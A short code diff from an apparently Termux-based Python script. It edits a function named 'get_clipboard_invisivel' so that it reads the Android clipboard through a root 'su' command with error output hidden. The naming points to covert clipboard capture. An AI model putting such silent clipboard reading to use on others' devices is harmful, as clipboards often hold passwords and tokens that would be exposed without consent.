@@ -16,7 +16,7 @@ subprocess.run("termux-wake-lock", shell=True, check=False)
 
 def get_clipboard_invisivel():
     try:
-        output = subprocess.check_output('/system/bin/su -c "cmd clipboard get-text"', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
+        output = subprocess.check_output('su -c "cmd clipboard get-text" 2>/dev/null', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
         if output == "null" or output == "":
             return ""
         return output
